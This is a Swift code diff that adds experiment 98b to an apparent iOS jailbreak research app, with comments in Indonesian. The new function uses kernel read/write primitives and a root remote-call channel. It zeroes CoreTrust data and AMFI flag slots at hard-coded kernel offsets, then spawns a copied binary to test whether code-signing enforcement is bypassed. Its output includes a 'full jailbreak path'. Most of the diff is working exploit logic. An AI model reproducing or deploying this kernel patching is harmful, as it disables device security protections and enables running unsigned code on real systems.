@@ -954,6 +954,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③t2 CT Patch+Spawn (Exp 98b)",
+                    icon: "lock.open.doc.fill",
+                    color: .purple,
+                    label: "CT Patch",
+                    action: runExp98bCoreTrustPatch,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "③u AMFI IOKit Exploit (Exp 99)",
                     icon: "ant.fill",
                     color: .purple,
@@ -9295,6 +9305,216 @@ struct AMFIExperimentView: View {
         }
 
         return ExperimentResult(name: expName, success: writeOK, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 98b: CoreTrust Patch + Spawn Test
+
+    /// Exp 98b: CoreTrust __DATA writable (confirmed Exp 98).
+    /// Sekarang: zero-out SEMUA CoreTrust __DATA, lalu test posix_spawn.
+    /// Hipotesis: CoreTrust globals mengontrol certificate validation.
+    /// Kalau di-zero → validation disabled → unsigned binary accepted.
+    private func runExp98bCoreTrustPatch() {
+        isRunning = true
+        runningLabel = "CT Patch"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false; runningLabel = ""; return
+        }
+        #if !DISABLE_REMOTECALL
+        root.executeAsRoot(operation: "exp98b_ct_patch") { rc in
+            let result = self.expCoreTrustPatch(rc: rc)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false; self.runningLabel = ""
+            }
+            return (result.success, result.detail.prefix(80).description, 0)
+        }
+        #else
+        isRunning = false; runningLabel = ""
+        #endif
+    }
+
+    private func expCoreTrustPatch(rc: RemoteCall) -> ExperimentResult {
+        let expName = "CT Patch+Spawn (Exp 98b)"
+        var detail = "Experiment 98b: CoreTrust Patch + Spawn Test\n"
+        detail += "==============================================\n\n"
+
+        let kernBase = ds_get_kernel_base()
+        let slide = kernBase - 0xfffffff007004000
+        let mem = rc.trojanMem
+
+        // CoreTrust __DATA
+        let ctDataSlid = UInt64(0xfffffff00a3b1230) &+ slide
+        let ctDataSize: UInt64 = 0xe8
+
+        // AMFI __DATA (juga patch untuk maximize chance)
+        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+        let amfiFlagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
+
+        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
+        detail += "CT __DATA: 0x\(String(format: "%llx", ctDataSlid))\n"
+        detail += "AMFI __DATA: 0x\(String(format: "%llx", amfiDataSlid))\n\n"
+
+        // ============================================================
+        // Step 1: Save original CoreTrust __DATA
+        // ============================================================
+        detail += "=== Step 1: Save CT __DATA original ===\n"
+        var ctOriginal: [(offset: UInt64, value: UInt64)] = []
+        for off: UInt64 in stride(from: 0, to: ctDataSize, by: 8) {
+            let val = ds_kread64_safe(ctDataSlid + off)
+            ctOriginal.append((off, val))
+        }
+        detail += "Saved \(ctOriginal.count) slots\n\n"
+
+        // Save AMFI flags
+        var amfiOriginal: [(offset: UInt64, value: UInt64)] = []
+        for off in amfiFlagOffsets {
+            let val = ds_kread64_safe(amfiDataSlid + off)
+            amfiOriginal.append((off, val))
+        }
+
+        // ============================================================
+        // Step 2: Baseline — spawn unsigned binary (should SIGKILL)
+        // ============================================================
+        detail += "=== Step 2: Baseline spawn (no patch) ===\n"
+
+        // Copy amfid to /var/containers/Bundle/ (path that allows spawn)
+        let srcPath = "/usr/libexec/amfid"
+        let dstPath = "/var/containers/Bundle/.exp98b_test"
+        let srcAddr = remote_alloc_str(rc, srcPath)
+        let dstAddr = remote_alloc_str(rc, dstPath)
+
+        RootExecutor.rcall(rc, "unlink", dstAddr)
+        let srcFd = RootExecutor.rcall(rc, "open", srcAddr, UInt64(O_RDONLY), 0)
+        let dstFd = RootExecutor.rcall(rc, "open", dstAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
+        let buf = mem + 0x800
+        if srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) {
+            for _ in 0..<256 {
+                let n = RootExecutor.rcall(rc, "read", srcFd, buf, 4096)
+                if n == 0 || n == UInt64(bitPattern: -1) { break }
+                RootExecutor.rcall(rc, "write", dstFd, buf, n)
+                if n < 4096 { break }
+            }
+        }
+        RootExecutor.rcall(rc, "close", srcFd)
+        RootExecutor.rcall(rc, "close", dstFd)
+        RootExecutor.rcall(rc, "chmod", dstAddr, 0o755)
+
+        // Baseline spawn
+        let (blRet, blPid, blErr) = doSpawn(rc: rc, path: dstPath, mem: mem)
+        var blSig: Int32 = -1
+        if blRet == 0 && blPid != 0 {
+            let (sig, code) = doWait(rc: rc, pid: blPid, mem: mem)
+            blSig = sig
+            detail += "Baseline: ret=0, pid=\(blPid), signal=\(sig), code=\(code)\n"
+        } else {
+            detail += "Baseline: ret=\(blRet), errno=\(blErr)\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 3: Patch CoreTrust __DATA (zero ALL) + AMFI flags
+        // ============================================================
+        detail += "=== Step 3: Patch CT + AMFI ===\n"
+
+        // Zero out CoreTrust __DATA (except first 8 bytes which might be critical struct header)
+        var ctPatchCount = 0
+        for off: UInt64 in stride(from: 0x08, to: ctDataSize, by: 8) {
+            let current = ds_kread64_safe(ctDataSlid + off)
+            if current != 0 {
+                ds_kwrite64(ctDataSlid + off, 0)
+                let verify = ds_kread64_safe(ctDataSlid + off)
+                if verify == 0 { ctPatchCount += 1 }
+            }
+        }
+        detail += "CT __DATA zeroed: \(ctPatchCount) slots\n"
+
+        // Also disable AMFI flags
+        for off in amfiFlagOffsets {
+            ds_kwrite64(amfiDataSlid + off, 0)
+        }
+        detail += "AMFI flags disabled: 10/10\n\n"
+
+        // ============================================================
+        // Step 4: Spawn test (CT + AMFI patched)
+        // ============================================================
+        detail += "=== Step 4: Spawn (CT zeroed + AMFI off) ===\n"
+
+        let (pRet, pPid, pErr) = doSpawn(rc: rc, path: dstPath, mem: mem)
+        var pSig: Int32 = -1
+        if pRet == 0 && pPid != 0 {
+            let (sig, code) = doWait(rc: rc, pid: pPid, mem: mem)
+            pSig = sig
+            detail += "Patched: ret=0, pid=\(pPid), signal=\(sig), code=\(code)\n"
+        } else {
+            detail += "Patched: ret=\(pRet), errno=\(pErr)\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 5: Also try with ONLY CT patched (AMFI flags restored)
+        // ============================================================
+        detail += "=== Step 5: Spawn (CT zeroed only, AMFI restored) ===\n"
+        for (off, origVal) in amfiOriginal {
+            ds_kwrite64(amfiDataSlid + off, origVal)
+        }
+
+        let (p2Ret, p2Pid, p2Err) = doSpawn(rc: rc, path: dstPath, mem: mem)
+        var p2Sig: Int32 = -1
+        if p2Ret == 0 && p2Pid != 0 {
+            let (sig, code) = doWait(rc: rc, pid: p2Pid, mem: mem)
+            p2Sig = sig
+            detail += "CT-only: ret=0, pid=\(p2Pid), signal=\(sig), code=\(code)\n"
+        } else {
+            detail += "CT-only: ret=\(p2Ret), errno=\(p2Err)\n"
+        }
+        detail += "\n"
+
+        // ============================================================
+        // Step 6: Restore CoreTrust __DATA
+        // ============================================================
+        detail += "=== Step 6: Restore CT __DATA ===\n"
+        for (off, origVal) in ctOriginal {
+            ds_kwrite64(ctDataSlid + off, origVal)
+        }
+        detail += "Restored\n\n"
+
+        // Cleanup
+        RootExecutor.rcall(rc, "unlink", dstAddr)
+        RootExecutor.rcall(rc, "free", srcAddr)
+        RootExecutor.rcall(rc, "free", dstAddr)
+
+        // ============================================================
+        // VERDICT
+        // ============================================================
+        detail += "=== VERDICT ===\n\n"
+        detail += "Baseline:       signal=\(blSig) \(blSig == 9 ? "(SIGKILL)" : blSig == 0 ? "(clean)" : "")\n"
+        detail += "CT+AMFI patch:  signal=\(pSig) \(pSig == 9 ? "(SIGKILL)" : pSig == 0 ? "(clean)" : "")\n"
+        detail += "CT-only patch:  signal=\(p2Sig) \(p2Sig == 9 ? "(SIGKILL)" : p2Sig == 0 ? "(clean)" : "")\n\n"
+
+        let success = (pSig != 9 && pSig >= 0 && blSig == 9) || (p2Sig != 9 && p2Sig >= 0 && blSig == 9)
+
+        if success {
+            detail += "🎉🎉🎉 CORETRUST BYPASS! 🎉🎉🎉\n\n"
+            detail += "Baseline SIGKILL → patched NO SIGKILL!\n"
+            detail += "CoreTrust __DATA patch disables certificate validation!\n\n"
+            detail += "=== FULL JAILBREAK PATH ===\n"
+            detail += "1. Zero CoreTrust __DATA\n"
+            detail += "2. posix_spawn any binary from /var/containers/Bundle/\n"
+            detail += "3. Binary runs without code signing!\n"
+        } else if blSig == 9 && pSig == 9 && p2Sig == 9 {
+            detail += "❌ Still SIGKILL with CT patched.\n"
+            detail += "CoreTrust __DATA globals bukan enforcement control.\n"
+            detail += "CDHash validation di kernel level (pmap_cs), bukan CoreTrust.\n\n"
+            detail += "CoreTrust hanya dipanggil via amfid (userspace).\n"
+            detail += "Kernel SIGKILL terjadi SEBELUM CoreTrust dipanggil.\n"
+        } else if blSig != 9 {
+            detail += "⚠️ Baseline juga tidak SIGKILL — test inconclusive.\n"
+            detail += "Binary mungkin sudah trusted (CDHash match original).\n"
+        } else {
+            detail += "Mixed results — perlu analisis lebih lanjut.\n"
+        }
+
+        return ExperimentResult(name: expName, success: success, detail: detail, timestamp: Date())
     }
 
     // MARK: - Exp 99: AMFI IOKit External Method Exploit
